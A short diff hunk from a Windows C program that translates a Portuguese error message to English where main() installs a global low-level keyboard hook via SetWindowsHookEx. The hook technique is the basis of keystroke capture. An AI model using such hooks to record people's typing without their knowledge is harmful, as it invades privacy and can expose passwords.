@@ -102,7 +102,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 int main() {
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (keyboardHook == NULL) {
-        printf("Erro ao instalar o hook de teclado\n");
+        printf("Error installing the keyboard hook.\n");
         return 1;
     }
 
